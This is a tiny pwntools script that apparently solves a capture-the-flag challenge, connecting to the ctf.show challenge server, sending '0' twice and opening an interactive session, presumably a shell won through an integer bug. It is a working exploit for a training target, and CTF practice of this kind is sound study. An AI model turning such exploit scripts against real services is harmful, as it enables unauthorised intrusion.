from pwn import *
context.log_level = 'debug'
#io = process('./int')
io = remote('pwn.challenge.ctf.show',28259)
io.sendline('0')
io.sendline('0')
io.interactive()
